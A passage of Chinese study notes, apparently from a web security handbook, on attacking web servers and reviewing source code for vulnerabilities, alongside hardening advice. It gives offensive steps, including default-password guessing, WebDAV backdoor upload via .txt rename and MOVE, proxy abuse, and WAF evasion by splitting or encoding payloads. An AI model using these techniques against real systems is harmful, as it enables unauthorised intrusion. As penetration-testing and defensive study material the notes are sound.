命令获取版本信息；然后根据得到的信息，了解安全模式是否激活，以及上网搜索可利用的漏洞情况； 隔离共享应用程序中的组件共享应用程序，例如 ASP 服务提供商提供的程序，通常使用大量的共享组件和客户定制组件。组件之间应减少信任关系，例如共享组件不可信任由客户定制组件发出的数据，并应对其进行严格的安全测试； 应特别注意共享日志与管理功能； 小结如果共享环境的安全机制做得好的话，可以帮助应用程序的开发者提高安全性，但是它也不可避免引入了一些难以解决的新问题。因为整个共享环境的安全从某种程度来说依赖于某个薄弱应用程序的最短板。攻击者通过攻击某个存在漏洞的应用程序，或者直接部署一个恶意程序，然后利用它来攻击整个共享环境； 18. 攻击 Web 服务器绝大多数 Web 应用程序都基于某种技术栈进行开发，并运行于某个 Web 服务器程序的背后；这样做的好处是可以极大的提高开发效率，开发者只关注业务逻辑本身即可，同时将大量通用的功能交由技术栈中的组件进行处理；但这也意味着风险，因为如果这些技术栈本身存在漏洞的话，攻击者就可以利用漏洞向应用程序发起攻击； Web 服务器配置缺陷Web 服务器通常含有大量的默认配置项，但是这些默认配置项本身可能存在着风险，如果开发者没有对其进行修改和强化的话，攻击者就有可能利用这些漏洞； 默认密码许多 Web 服务器程序包含管理接口，以便开发者访问并对服务器进行管理，有些接口位于某个默认的路径，有些则是运行在 8080 或者 8443 端口，并且使用默认密码 更有趣的是，除了服务器程序外，还有大量的设备使用禁止修改其默认密码的接口，例如交换机、打印机、无线AP 等； 以下两个网址收集了各种使用默认密码的场景： www.cirt.net/passwords www.phenoelit-us.org/dpl/dpl.html 渗透测试步骤： 在解析应用程序的环节，留心应用程序所使用的 Web 服务器程序和相关技术，以确认是否包含可访问的管理接口； 对 Web 服务器进行端口扫描，探查指向目标应用程序的所有管理接口； 找到接口后，查阅相关文档，了解这些接口所使用的默认密码；使用 Metasploit 的内置数据库扫描服务器； 如果默认密码无效，则尝试猜测有效的密码； 如果能够访问管理接口，则解析所有可用的功能， 看是否可以加以利用，进一步攻破主机和应用程序； 默认内容由于 Web 服务器程序是开源的，那么这同时意味着该程序有着丰富的文档内容和教程，可被攻击者利用，例如： 方便开发者调试的功能； 用于演示某些常见任务的样本功能； 开发者忘了禁止公共访问的某些隐藏的强大功能； 文档 调试功能调试功能对攻击者非常有用，因为它会展示大量配置信息和应用程序的状态；例如调用 Apache 自带的 phpinfo 文件，就会返回 php 程序的相关信息，例如配置项、版本号、文件路径等； 样本功能许多服务器程序会提供一些样本脚本，来演示如何调用服务器的相关功能。由于是基于演示的目的，为了让读者容易理解，这些脚本一般会特意编写的比较简单，但这也意味着攻击者可以利用里面可能存在的安全漏洞； 示例1：Jetty 7.0.0 版本的 Dump Servlet 可以通过 /test/jsp/dump.jsp 的 URL 访问，攻击者可以在 URL 标签中注入脚本代码； 示例2：Tomcat 的 Session Example 脚本可用于修改会话变量，攻击者可以利用它来攻击用户的会话，查看会话中的敏感信息，并修改会话，让应用程序执行开发者预期外的行为； 隐藏功能许多服务器程序使用和应用程序本身相同的 HTTP 端口来进行部署，常常只要提供正确的密码，就可以访问这些功能；许多黑客的攻击方法简单粗暴，总结为三板斧： 扫描端口+默认密码 上传恶意文件 执行恶意文件，获得 shell 管理功能 JMXJBoss 自带的 JMX 控制台提供了大量关于构建和部署程序的功能，因此里面也隐藏了很多安全漏洞； 例如使用 DeploymentFileRepository 的 store 方法上传包含恶意代码的 WAR 文件；通过 Metasploit 等工具可以很方便高效的利用这类漏洞； 数据库网关 PL/SQLOracle 服务器程序提供的 PL/SQL 网关产品，功能很强大，它提供了向数据库发送请求的接口，可以根据开发者提供的请求参数，转化成 SQL 请求发给数据库，简化开发者的工作；但是这也意味着攻击者可以利用它来实施数据库查询；虽然 Oracle 使用了白名单来作为补丁，但是仍然难以攻击者借道白名单之外的其他强大功能来实现攻击； 渗透测试步骤： 可以使用 Nikto 等工具来确定应用程序自带的默认内容； 利用搜索引擎确定应用程序使用的技术栈和相关的默认内容； 在本地安装这些技术，从中查找潜在的默认功能漏洞，并进行调试； 目录列表当请求的资源是某个目录的名称，而不是某个文件名称时，不同的应用程序可能会有不同的响应方式，常见的有3种： 返回 403，表示请求被禁止； 返回一个默认文件，例如 index； 返回目录中的文件列表（有些程序用它来做内容导航）； 返回文件列表有两个安全隐患： 一些敏感文件不小心在列表中被泄露，例如日志文件、备份文件、旧的脚本文件等； 开发者可能忘了对文件实施正确的访问控制，因为预期攻击者不知道这些文件的路径； 渗透测试步骤： 向 Web 服务器上的每一个目录发送请求； 从响应中找出会返回目录列表的路径； 攻击者还可以通过已经发现的漏洞，让服务器返回文件列表； HTTP 云存储由于云存储越来越普及，因此开发者需要提供一套基于 HTTP 协议的方法，让用户对分页式存储的文件进行访问和操作，WebDAV 就是一种常见的解决方案； 除了 GET 和 POST 外，WebDAV 通常还支持以下方法：PUT 上传文件、DELETE 删除文件、COPY 复制文件、MOVE 移动文件、SEARCH 搜索文件、PROPFIND 获取文件头信息； 可以使用 OPTIONS 方法获取某个特定目录支持的所有 HTTP 方法； 其中最危险的是 PUT 方法，因为它意味着攻击者可以上传恶意脚本；通常应用程序会对目录访问实施一定的权限控制，因此需要在测试过程中进行递归检查，找到被开发者漏洞的目录； 除了权限控制外，WebDAV 一般会基于某些脚本文件后缀名来限制用户上传的文件类型，从而避免引入恶意代码；但是 HTML 和 JAR 文件一般被允许，这意味着攻击者利用这两种类型的文件即可实现攻击； 渗透测试步骤： 使用第三方工具，例如 Burp Repeater 发送请求； 使用 OPTIONS 方法列出服务器支持的 HTTP 方法；不可完全相信 OPTIONS 请求的结果，因为实际上支持的方法取决于应用程序，而不是服务器程序；因此需要对所有可用和不可用的方法，都进行测试； 发现可用的方法后，先尝试上传良性文件，再尝试上传后门脚本； 如果发现脚本后缀被限制，则可以改成 txt 后上传；待上传成功后，再使用 MOVE 命令改成正确的后缀名； 如果以上方法都不行，则尝试上传 HTML 和 JAR 文件； 使用 davtest.pl 之类的工具自动遍历所有目录； 代理服务器如果 Web 服务器不直接对外提供服务，而是仅作为代理服务器，那么可能存在以下攻击面： 访问未在公网上暴露的内部网络； 转发恶意请求，隐藏攻击者的身份； 访问代理服务器上运行的其他服务，利用信任关系避开防火墙的限制； 如果 Web 服务器负责转发请求，当给它发一个完整 URL 的 GET 请求时，请求将会被转发到目标主机；但也有一些服务器没有转发，而是从自己的根目录中返回被请求的资源； 尝试使用 CONNECT 方法连接目标主机和端口号，如果服务器做出正确的响应，则说明它在代理到目标主机的连接；当连接建立以后，就可以尝试攻击非 HTTP 服务；但是，大多数服务器对可用端口做出严格的限制，一般只能访问 443 端口，无法访问其他端口；但是也说不定，有些开发者可能没有仔细配置，导致其他端口也暴露了； 渗透测试步骤： 使用 GET 和 CONNECT 请求，尝试用 Web 服务器作为代理服务器，连接因特网上的其他服务器，核对返回的响应内容； 当使用 CONNECT 建立连接后，尝试在请求中的 HOST 字段中指定不同的 IP 地址和端口号，扫描其本地可用服务；并在请求中指定 127.0.0.1 作为目标主机，连接 Web 服务器上的可用端口号； 虚拟主机配置缺陷当 Apache 代理多个站点时，一般配置文件的内容如下： 1234&lt;VirtualHost *&gt; ServerName eis DocumentRoot /var/www2&lt;/VirtualHost&gt; 这个配置文件的问题在于，它仅说明了特定 Web 站点的配置选项，却忘了 Web 服务器本身是有默认站点值的，该默认站点的值并未进行配置或修改，因此攻击者可以通过访问默认的虚拟站点进行攻击； 渗透测试步骤： 使用以下方式向根目录提交 GET 请求 正确的 Host 消息头； 随意的 Host 消息头； Host 消息头中的服务器 IP 地址； 无 Host 消息头； 进行以上请求的响应内容；一般来说，在 Host 消息头中指定 IP 地址可获得目录列表，以及各种默认的内容； 如果观察到不同的行为，使用造成异常行为的 Host 消息头重复解析过程，并使用 Nikto 等工具的 -vhost 选项进行扫描，尝试找到任何的默认内容； 保障 Web 服务器配置的安全疏忽大意和没有安全意识，是造成 Web 服务器漏洞的主要原因，因此在使用某个 Web 服务器软件之前，有必要对其文档进行深入的学习，以及相关的安全强化指南等教程； 常见配置问题如下： 修改任何默认的密码，删除任何不必要的账户； 对非标准端口设置防火墙，禁止公众访问； 对 Web 根目录所指向的路径实施访问控制； 删除与应用程序无关的不必要的默认内容和功能（可使用 Nikto 工具进行重复检查）； 如果部分默认功能需要保留，则应相应的进行安全强化，禁止不必要的选项和行为； 如果可能，关掉整个 Web 服务器的目录列表功能；确保每个可访问目录包含服务器默认提供的 index.html 文件； 除应用程序必须的方法外，禁用所有其他方法； 确保没有将 Web 服务器配置为代理服务器；如果一定要开启代理功能，则应只允许它连接特定主机和端口；并添加网络层的过滤，控制服务器向外发送的请求； 如果 Web 服务器支持虚拟主机，则应同时确保主机上完成了 Web 服务器需要的相关配置，以确保 Web 服务器的安全强化措施确实得以实现； 易受攻击的服务器软件由于攻守双方的博弈，随着时间推移，主流 Web 服务器平台变得日渐可靠，但由于 Web 服务器软件仍然在不断发展，因此新的漏洞仍然在不断产生，大多数新漏洞存在于以下软件中： IIS 和 Apache 的服务端扩展； 从头新开发的 Web 服务器（由于产品很新，之前较少受到黑客关注，因此容易隐藏未发现的漏洞）； 应用程序框架缺陷多年来，Web 应用程序框架一直存在着各式各样的缺陷，示例如下：.NET 填充提示漏洞 .NET 加密过程： 选择一段明文信息； 计算信息长度，得到应填充的字符数量； 填充相应的字符数到消息中 对填充后的明文信息分成相等大小的多个小组 将第一个小组与初始向量（某个初始值）进行 XOR 运算（初始向量或许也可以看做是第 0 个分组）； 对第一个小组的 XOR 运算结果进行 3DES 加密，得到第一个小组的加密值； 选择第二个小组，与上一个小组的加密值进行 XOR 运算； 对第二个小组的 XOR 运算结果进行 3DES 加密，得到第二个小组的加密值； 选择第三个小组，重复第 7 和第 8 两个步骤； 上面这个加密过程本身并没有什么漏洞，但好死不死的是曾经的 .NET 版本还有另外一个看似无害的信息泄露漏洞，即如果 .NET 在请求参数中发现加密填充错误，则应用程序会返回 HTTP 500 状态码。因此，攻击者可以利用这个信息泄露漏洞，逐位的进行试错，破解初始向量 IV；之后攻击者除了可以利用 IV 解密信息外，还可以利用它来加密信息，并利用框架对该加密值的信任关系，执行恶意指令； 教训：两个或者多个看似无害的漏洞，组合起来可能变得非常的有害； 内存管理漏洞考虑到性能，多数服务器程序是使用编译型语言编写的，这也意味着它们很可能存在缓冲区溢出漏洞； Apache mod_isapi 悬挂指针：2010 年版本的 Apache 在遇到错误时，系统将从内存中强制卸载 mod_isapi，但是函数指针仍然保留在内存中，这意味着攻击者可以调用该指针，访问其指向的内容； Microsoft IIS ISAPI 扩展：2001 年该漏洞使得攻击者可以在 Local System 权限下执行任意代码；2008 年该扩展被发现了另外一个漏洞； Apache 分块编码溢出：2002年，被发现存在整数符号错误造成的漏洞；2010年，被发现 mod_proxy 在处理 HTTP 响应的分块编码时，存在整数溢出； WebDAV 溢出； 编码与规范化漏洞一个请求到达服务器后，可能会被很多层的组件进行处理，例如服务器程序、应用程序业务逻辑、第三方库、操作系统等；这些组件可存在使用不同的编码处理方式，导致攻击者有机会利用这种差异避开过滤或者造成程序的异常行为； Apple iDisk Server 路径遍历漏洞：攻击者可以将路径遍历指令编码到请求参数中； Ruby WEBrick Web 服务器遍历漏洞：详见 http://www.securityfocus.com/bid/28123 Java Web 服务器目录遍历：JVM 不对 UTF-8 进行解码，因此攻击者通过 UTF-8 编码的 ../ 可实现路径编码，详见：https://tomcat.apache.org/security-6.html Allaire JRun 目录列表漏洞：JRun 会将 url 中以 jsp 结尾的请求，转发给负责 JSP 文件的组件处理，而该组件会对文件名进行 URL 解码，如果文件名是一个问号，则会当作查询关键字，查询目录内容并返回；详见 https://www.securityfocus.com/bid/3592 Jetty 也存在类似上例的漏洞，详见：https://www.kb.cert.org/vuls/id/402580 Microsoft IIS Unicode 路径遍历漏洞：攻击者通过提交 ../ 的各种非常 Unicode 编码形式来避开过滤；虽然 IIS 本身对路径遍历实施过滤，但是难以全面覆盖各种非法的形式； WebDAV 也存在类似上例的漏洞，攻击者通过在请求路径中插入 %c0%af，实现对受 ISS 保护文件的下载； 避开 Oracle PL/SQL 的过滤列表：虽然 Oracle 使用了过滤名单，但是攻击者通过将恶意指令进行编码，避开过滤清单的匹配，同时编码后的指令仍然可以由后端数据库进行解码并正确执行；这种漏洞普通存在，根本原因在于前端检查基于字符串匹配，但是后端却接受各种奇怪怪的编码形式，防不胜防，详见：http://www.securityfocus.com/archive/1/423819/100/0/threaded 查找 Web 服务器漏洞本章描述的各种漏洞由于时间悠久，因此这些版本的新版本可能都已经修复了以上漏洞，但重要的是背后的思路和本质。一般可以先从使用自动化扫描工具开始，对服务器程序进行测试，例如 Nessus； 另外还可以从以下站点查找最新的漏洞消息： Security Focus OSVDB Bugtraq 和 Full 邮件列表 当发现一些新漏洞后，再看一下 Exploit Database 和 Metasploit，看是否有人已经开始探查该漏洞； www.exploit-db.com www.metasploit.com www.grok.org.ukfull-disclosure http://osvdb.org/search/advsearch 如有可能，应该在本地安装目标软件进行测试，查找已知的广泛流传的漏洞，或者其他尚未发现的漏洞； 保障 Web 服务器软件的安全由于 Web 服务器软件通常是由第三方进行开发的，因此本质上来讲，客观存在一定程度的不可控因素。但是开发人员仍然可以采取一些有效的预防措施，降低风险的概率，包括如下： 选择记录良好的软件记录良好的标志包括： 存在严重漏洞的数量； 供应商是否及时修复这些漏洞并发布补丁； 应用供应商发布的补丁 有责任的供应商都会定期发布补丁，有时候问题是供应商内部自己发现的，有时候是由外部人员告知的。当补丁发布后，通过逆向工程很快就可以查找该补丁所要解决的问题所在，之后黑客便可以根据补丁所要修复的问题，对那些还未进行更新的应用程序发起攻击； 实施安全强化开发人员除了认真查看 Web 服务器软件中的强化指南外，还需要采取以下强化措施： 禁用一切不必要的功能。余下功能则应尽可能配置成严格执行的模式，可使用 IIS Lockdown 等工具来完成这个工作； 如有编译型语言编写的组件，则考虑是否改由解释型语言编写；如果不能，则应使用解释型语言的代码，对用户的输入进行检查过滤，确保安全后，再转发给编译型的组件； 对开启的功能进行重命名，这种模糊处理虽然不能从根本上解决问题，但可以防御一些自动化工具和一些新手； 实施最低权限原则，例如使用最低权限的操作系统账户，在 UNIX 环境中使用 chroot 环境以限制攻击的范围； 监控新的漏洞安排专职人员监控 Bugtraq 和 Full Disclosure 等网站，第一时间了解漏洞消息，并有效的进行改进； 使用多层防御实施多层的保护，以便万一 Web 服务器被攻破了，也能够最大程度的减少损失；常见措施包括： 限制 Web 服务器对其他应用程序组件的访问权限，例如只允许服务器账户使用数据库的 INSERT 功能，这样可以避免攻击者删除日志记录； 对进出 Web 服务器的流量实施严格的网络过滤； 使用入侵检测系统，以第一时间发现入侵行为；攻击者在攻破 Web 服务器后，一般会尝试建立反向连接，或者扫描DMZ 网络中的其他主机；入侵检测系统可以第一时间探查这些行为，并发出警报； Web 应用程序防火墙大多数应用程序都受到某种外部组件的保护，这些组件通常安装在相同主机上面，或者网络设备上面，提供入侵防御或入侵检测的功能。但实际上，它们能够发挥的效果非常的有限，但却给人们造成了更加安全的错觉，从而可能放松了警惕；这类组件的原理基本类似，它们都是基于特定的常见攻击荷载，而不是基于利用漏洞的常规方法 渗透测试步骤： 可以使用以下方法推断是否安装了 Web 应用程序防火墙 选择应用程序某个会在响应中返回所请求的参数值的 URL，提供一个随机的参数名，并在参数值中包含有效的攻击荷载；如果应用程序阻止了攻击请求，则说明很可能有外部防御组件； 如果某个请求参数值会在响应中返回，则修改该参数值，提交一系列模糊测试字符串，以及这些字符串的编码形式，观察响应结果，与原始请求参数进行比对，了解应用程序对请求参数的过滤检查机制； 针对参数的过滤检查机制，设计有效的攻击荷载，再次发起请求，确认是否存在入侵检测行为； 通过提交以下字符串，尝试避开应用程序的防火墙： 根据 IDP 入侵检测程序的工作原理，可以相应的设计出不会被其关键字库匹配到的字符串，作为攻击荷载，例如避免在 XSS 攻击中出现 &lt;script&gt; 字样或者 alert、xss 等字样； 如果特定的请求被阻止，则可以尝试在请求中的不同位置放入相同的参数，例如 GET 请求的 URL，POST 请求的消息体、POST 请求的 URL、cookie、页面隐藏参数等（详见第 4 章）； 找到接受非标准格式（如序列化和编码）参数的位置，提交攻击荷载； 将攻击荷载分布到多个参数中进行提交； 使用字符串串联功能来提交（例如 ASP.NET 的 HPP 功能）； 19. 查找源代码中的漏洞如果有机会源代码的话，那么只要掌握一些常用的技巧，即使不是专业的编程人员，也能够从源代码中发现很多潜在漏洞； 代码审查方法黑盒测试与白盒测试黑盒和白盒各有其优缺点，由于黑盒可以使用自动化的攻击工具，因此在大多数情况下，其发现漏洞的效率比较高，毕竟阅读源代码本身需要花费很多时间。但有少数漏洞则是阅读源代码就能直接发现漏洞，黑盒反而需要很长时间，例如一个通用的后门密码会明文的写在源代码中，但是通过黑盒测试很难发现它； 最好的方式是二者相互补充，在阅读源码的过程中，如果发现了潜在漏洞，就使用黑盒进行自动化的测试，看漏洞是否能够触发； 代码审查方法对于功能复杂的应用程序，源代码通常有成千上万行，从头到尾逐一阅读并不是最好的办法，可以使用结构化的技巧，来提高漏洞查找效率： 从数据进入点开始追踪整个处理的流程，审查负责处理这些数据的代码（不同的 Web 开发语言，其处理框架不同、常见配置不同，可事先阅读文档进行了解）； 在代码中搜索隐含常见漏洞的代码关键字，审查包含关键字的代码，确定是否存在漏洞； 对包含敏感功能的代码进行审查，理解其逻辑，审查是否存在安全问题。这些敏感功能包括：身份验证功能、会话管理、访问控制、输入确认、外部组件接口、动态库调用； 应用程序很可能对第三方库和 API 进行定制化的封装或扩展，在审查之前，可预先了解封装的内容； 常见漏洞特征漏洞的关键特征并不区分语言，虽然各种语言的语法不同，但是相同的漏洞，仍然在不同的语言中，呈现相同的特征 跨站点脚本在典型的 XSS 漏洞中，代码会从用户的请求参数中，提取参数值，生成 HTML 页面内容； 以及从请求参数中提取内容，作为响应中的变量值： 此处的漏洞微妙，即仅当 requestType的值为 3 的时候，漏洞才有可能被触发，这种漏洞在黑盒测试中不容易发现，除非使用对每一个参数都进行单独的测试； SQL 注入SQL 漏洞的典型特征是提取用户的输入，然后和各种硬编码的字符串组成 SQL 查询指令； 只需要在代码中搜索 SQL 指令的关键字片断，就很容易很到这一类硬编码的字符串； 注意：SQL 指令不区分大小写，因此搜索的时候，应该启用大小写不敏感的功能； 路径遍历调用操作系统 API 的位置，最有可能出现路径遍历漏洞， 此时代码常常将用户输入值附加在某个目录名称后面，组成完整的路径；此类漏洞常常出现于允许用户上传和下载文件的功能中； 任意重定向重定向漏洞的特征在于从用户提交的输入中提取内容用来组成 URL 值； 除了服务端外，客户端的 JS 代码也可能存在重定向漏洞，因此客户端 JS 代码也会提取用户的输入生成 URL；由于 JS 代码是明文的，任意用户都可以查看，因此攻击者无须权限，就可以核查里面的内容，是否包含可利用的漏洞； 在对参数值进行检查确认之后，再次解码就会引入漏洞，因为攻击者可以先将攻击荷载进行双重编码，第一次解码后，可通过检查；等到第二次解码时，再让攻击荷载真正生效起来；例如设计成这样： OS 命令注入 通常各种语言都有内置调用操作系统命令的方法，搜索这些方法的关键字即可，例如此处的 system； 后门密码为了调试方便，一般开发者会将后门密码写在身份验证的函数中，非常容易确认； 可执行文件漏洞应对可执行文件的源代码进行审查，确保里面没有包含一些常见的漏洞，例如： 缓冲区溢出漏洞当创建某个内存缓冲区后，接下来会调用 API 往缓冲区中写入数据，漏洞发生在写入的环节。有多个内置函数可以实现对缓冲区的写入，重点应该注意这些写入的内容，是否由用户控制，以及写入之前，是否对长度进行检查。通过在源代码中搜索每一个调用缓冲写入函数的位置，即可以排查漏洞； 常见的缓冲区写入函数有：strcpy、memcpy、sprintf 及它们的各种变体； 整数漏洞整数漏洞总体来说比较隐蔽，不仔细思考一眼不一定看得出来。但有些情况比较明显，例如有符号整数和无符号整数的比较时（原因：隐式转换）；例如 len 和 sizeof 的比较； 格式化字符串漏洞通过搜索 printf 和 FormatMessage 系列函数的位置，如果参数由用户控制，则很可能存在漏洞； 源代码注释当开发者觉得某段代码存在隐患，为避免遗忘，一般会在注释中写下说明，以便后续能够快速想起。但由于各种不可控的原因，这些隐患经常没有在第一时间得到排除，导致它们一直存在。通过在注释中搜索一些常见的关键字，可用来发现这类问题，常见关键字有：bug, problem, bad, hope, todo, fix, overflow, crash, inject, xss, trust, error 等； Java 平台获取用户提交的数据Java Web 程序一般通过 javax.servlet.ServletRequest 以及它的扩展 javax.servlet.http.HttpServletRequest 两个接口来获取用户提交的请求数据，这两个对象包含大量的方法，可用来提取请求对象中的内容； 会话交互Java Web 程序一般通过 javax.servlet.http.HttpSession 接口来管理用户的会话，该接口常用方法如下： 潜在的危险 API文件访问Java 一般使用 java.io.File 类来访问文件或目录，它的构造函数接收路径或者目录+文件名做为参数进行实例化，如果在构造函数中没有检查点和斜线，并且参数由用户控制，则可能存在路径遍历漏洞； 关于文件内容的读写，Java 常用类如下： 它们同样存在和 java.io.File 相同的问题 数据库访问以下几个用于查询数据库的 API 容易受到 SQL 注入攻击，因为它们的查询参数直接由拼接字符串的方式实现； 另外一种更加安全的做法，是避免拼接字符串，而是以替换指定位置的字符串来实现（通过 prepareStatement），包括如下： OS 命令执行Java 调用系统命令的 API 如下： 如果传递给这些 API 的参数能够被用户控制，则存在命令注入漏洞。但如果用户只能控制部分字符串，例如只能指定命令参数，而不能指定命令名称，那么出现漏洞的概率就比较小； 重定向Java 发送重定向响应的相关 API 如下： 攻击者除了通过 sendRedirect 来实现重定向外，还可以使用 setStatus 为 3XX，同时通过 addHeader 添加 Location 字段，来实现重定向； 套接字Java 使用 java.net.Socket 类来创建 socket 连接，如果用户能够控制传递给 socket 类的参数，则可能存在漏洞，因为攻击者可以利用该 socket 连接，访问其他主机； 配置 Java 环境Java web 环境配置参数一般放在 web.xml 文件中，内容一般包括登录验证方式，资源访问控制等； 除了 web.xml 文件外，还有部分相关配置参数放在应用程序服务器的配置文件中，例如 weblogic.xml 文件等，应同时检查这些配置文件，查看是否存在漏洞； ASP.NET获取用户提交的数据System.Web.HttpRequest 类 会话交互Session 类：保留跟当前会话相关的用户信息； Profile 类：用于保存用户的个性化设置，因此它是持久性的，跟当前会话无关； System.Web.SessionState.HttpSessionState 类：也可以用来保存会话信息，相关的方法如下： 潜在的危险 API文件访问System.IO.File 类： 读取和写入的类： 数据库访问 同 Java 一样，如果直接拼接查询字符串会存在漏洞隐患，更安全的做法是通过 Parameters 属性来创建使用参数占位符的查询语句； 动态代码ASP 通过 VBScript 可以接受动态代码，相关几个函数包括： Eval 函数：接受 VBScript 代码字符串； Execute 函数：接受 ASP 代码字符串； ExecuteGlobal 函数：接受 ASP 代码字符串； OS 命令执行 如果可以直接向 Start 传递字符串参数，或者通过 StartInfo 传递参数，则存在漏洞隐患。 即使仅能控制部分字符串，也有隐患： 另外通过 ProcessStartInfo 的 Arguments 属性，如果用户可以控制 Arguments 的参数，则虽然攻击者不能执行指定代码，但可以通过指定参数，影响命令的期望行为，例如下载恶意文件到主机的任意位置； 重定向 套接字System.Net.Sockets.Socket 类，漏洞利用方法跟 Java 平台一样； ASP.NET 环境配置环境配置参数放在 Web 根目录下的 web.config 文件中 PHP获取用户提交的数据PHP 使用一些内置变量来保存用户的请求数据 在处理用户的输入时，PHP 有一些特殊的用法： $GLOBALS 对象用来访问预先定义的全局变量； 如果配置项 register_globals 开启，则 PHP 会为每个请求参数建立全局变量，访问程序中的代码在各处实现访问请求参数，而无须传递这些请求参数；这会给代码审查增加一些额外的工作，因为对请求参数的引用，变得更加隐蔽了； $_SERVER 数据中可以访问用户提交的定制消息头； 如果请求参数中的某个参数名称包含索引引用，则该参数的值将被自动转换成对象类型； 会话交互 潜在的危险 API文件访问PHP 中读写文件的函数有很多个，其中一些还可以访问远程文件； 如果直接向上面这些函数传递拼接后的字符串，则将存在漏洞隐患； 另外还有一些函数用于执行 PHP 脚本，如果用户可以控制传递给它们的参数，则也非常危险； 访问远程文件的功能默认是打开的，可通过配置参数 allow_url_fopen 将其关闭；但是关闭后，仍然有几个方法可用于访问远程文件，PHP 在 5.2 以上版本引入了 allow_url_include 参数并默认将其关闭来避免上述漏洞； 数据库访问 以上函数直接接受字符串查询参数，易于受到攻击。下面几个函数则使用占位符的方式插入查询参数，相对安全； 动态代码 动态代码的多个语句使用分号进行分隔，如果用户可控制参数，则易于受到脚本注入攻击； 另外搜索替换功能的正则表达式函数 preg_replace，如果以 /e 选项调用，则会执行 PHP 代码；若用户可控制参数，则存在漏洞隐患； PHP 还接受函数名称做为变量，然后动态调用该函数；因此攻击者可以通过指定相应的参数名称，让 PHP 调用某些内置的敏感函数，如 phpinfo，获取与 PHP 运行时环境相关的信息； OS 命令执行 跟 JAVA, ASP 不同，PHP 的系统命令接口，接受 | 字符用来对多个命令进行连接，因此它非常危险；如果未对用户的输入进行过滤，意味着攻击者有机会执行任意的系统命令； 重定向 实现重定向有两种方法，一种直接使用 http_redirect API，另外一种是通过 setResponseCode 和 setHeaders； 套接字 通过 socket_create 函数可与任意的主机建立连接，无论是公共的因特网，还是私有网络上的任意主机；fsockopen 和 pfsockopen 函数在建立连接后，可返回一个标准文件指针，供 fwrite 和 fgets 等函数调用，从而实现两个主机之间的数据传输； 配置 PHP 环境PHP 配置参数放在 php.ini 文件中，它的内容结构和 windows ini 文件类似，里面有很多不安全的选项（新版本的 PHP 删除掉了很多问题选项）； 使用全局变量如果 redister_globals 选项被开启，则 PHP 会为每个请求参数建立全局变量；如果变量在使用前没有预先初始化一个值，那么攻击者就可以将某个变量设置为任意值，从而存在应用程序的逻辑； PHP 4.2 以上版本将 register_globals 设置为默认关闭了，并在 PHP 6 以下版本完全去除了该选项； 安全模式如果开启 safe_mode 模式，则某些危险的函数将被禁用，某些敏感函数的功能会受到一定的使用限制；例如： shell_exec 函数被禁用，原因：该函数可用于调用任意的操作系统命令； mail 函数的 additional_parameters 参数被禁用，原因：该参数存在 SMTP 注入漏洞； exec 函数仅限于执行 safe_mode_exec_dir 中指定的可执行程序，并且将转义命令行中的元字符； 虽然 safe_mode 限制了部分危险函数，但是由于它不可能限制所有的函数，因此攻击者仍然有机会通过其他函数曲线救国，实施攻击。因此在 PHP 6 以上的版本，安全模式已经被删除了； magic quotes当 magic quotes 选项被激活时，PHP 将转义请求参数中的任何单引号、双引号、反斜线和空格（即为它们添加一个反斜线）。该选项的目的是防范 SQL 注入攻击； 但事实上，这个功能的效果很有限，因为攻击者可以使用二阶攻击的方式来避开转义，另外在 SQL 中注入数字字段时，也不需要单引号。 更搞笑的是，某些数据的处理并不能添加转义，因此如果开启了 magic quotes 选项，则开发者还需要在源代码中，删除 PHP 添加的转义符，从而对请求参数做出一些原本并不需要的修改，导致出现混乱； 通常建议关闭该选项，因为它是针对所有请求参数的，太没有针对性了，很容易引入更多的麻烦。更好的做法是使用预处理语句，来安全的访问数据库； PHP 6 以上版本已经删除了该选项； 其他 PerlPerl 是一种非常灵活的语言，同一个任务，有很多种写法，这也意味着漏洞的敞口很大，尤其是在自主开发的模块中，部分没有经验的开发者有可能在其中引入一些危险的函数来执行任务。Perl Web 程序通常使用 CGI.pm 模块来构造（后面的内容围绕该模块展开，如果不是使用该模块，则相关功能的 API 需要另外查文档确定； 获取用户提交的数据 会话交互Perl 使用 CGISession.pm 模块来实现会话管理，写法如下： 潜在的危险 API文件访问 open 接受文件名参数，实现向指定文件写入或读取内容，因此如果用户可以控制文件名参数，则攻击者可以利用它来访问任意文件；更狠的是， open 还允许在参数中使用管道连接符 “|”，如果参数中包含管道符，则参数内容将被发送给 shell，因此攻击者可以利用它来执行任意的操作系统命令； 数据库查询 selectall_arrayref do 较安全的做法是使用包含占位符的语句，通过下面两个函数来实现： prepare execute 动态代码Perl 也使用 eval 函数来执行动态代码，同时使用分号作为分隔符，连接多个语句； OS 命令执行 system exec qx 反单引号 ` 以上函数都接受管道符，因此攻击者可以利用以上函数，执行任意的操作系统命令； 重定向 redirect：其参数可以是相对 URL，也可以是绝对 URL 的字符串； 套接字 socket：创建套接字 connect：建立连接 配置 Perl 环境相对于 PHP 使用安全模式，Perl 比较有意思，它使用污染模式，即默认用户的输入都是被污染和不安全的，如果有任意变量是基于用户的输入来赋值，那么该变量也会视为被污染的变量； 污染的变量无法作为一些标记为敏感函数的参数，如 eval、system、exec、open 等，需要使用正则表达式对污染变量进行净化后，才可以使用，示例如下： Perl 的污染模式相当于要求开发者强制对输入进行过滤，从某种程度来说，确实提高了开发者的安全意识； 虽然污染模式的初衷是很好的，但是它的安全防御效果，还取决于开发者能否写出正确有效的正则表达式，如果不行的话，仍然是存在漏洞隐患的； Javascript前端的 JS 代码无须任何权限，即可被用户查看。查看这部分代码有助于了解前端实施了哪些输入检查机制，以及动态生成的页面结构；有两个位置存在 JS 代码，一个是 js 文件，另外一个是嵌入在 HTML 中的 JS 代码； 主要的检查点为 DOM 操作以及对当前文档进行修改的 API； 数据库组件由于数据库软件变得越来越强大，因此它的功能已经不再局限于存储数据，而是围绕存储目标，进行了强大的扩展和增强，因此也经常被用于执行一定程度的业务逻辑。这些扩展的功能包括：存储过程、触发器、自定义函数等；因此，在审查源代码时，也有必要同时审查写在数据库组件中的代码； 数据库组件的安全隐患，从本质上来说，跟其他语言并没有区别，只是语法稍有不同而已，常见的漏洞仍然为下面两类： 存在 SQL 注入漏洞； 使用用户参数，调用敏感函数 SQL 注入除了在业务源代码层面排除注入隐患外，还需要检查存储过程，因为有些隐患发生在这些地方，示例如下： 不同的数据库软件，其动态执行 SQL 语句的命令不同，常见数据库及其命令名称如下： 调用危险的函数数据库本质上是一个软件，运行的时候，它自己即是一个进程，因此它具有所有进程都会拥有的功能，可以在权限范围内执行任意的系统命令。为了增强数据库本身的功能，它开放了一部分接口供开发者在存储过程中调用，这在带来方便的同时，也引入了安全隐患；攻击者可以利用它来执行任意的操作系统命令； 